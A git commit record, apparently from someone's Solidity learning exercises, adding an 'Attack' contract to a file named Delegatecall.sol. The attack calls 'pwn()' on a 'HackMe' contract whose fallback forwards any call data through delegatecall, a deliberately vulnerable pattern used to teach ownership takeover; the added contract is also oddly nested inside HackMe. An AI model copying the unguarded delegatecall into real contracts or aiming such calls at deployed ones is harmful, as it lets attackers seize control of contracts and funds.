c0a3fbf8ce69aa53442ab7e07f00849b9481eb95
jinwon93 <kjw8208@nate.com>
2022-06-15 21:34:09 +0900

    20220615

--- Applications/Delegatecall.sol
+++ Applications/Delegatecall.sol
@@ -22,4 +22,17 @@ contract HackMe {
     fallback() external payable {
         address(lib).delegatecall(msg.data);
     }
+
+
+    contract Attack {
+    address public hackMe;
+
+    constructor(address _hackMe) {
+        hackMe = _hackMe;
+    }
+
+    function attack() public {
+        hackMe.call(abi.encodeWithSignature("pwn()"));
+    }
+    }
 }
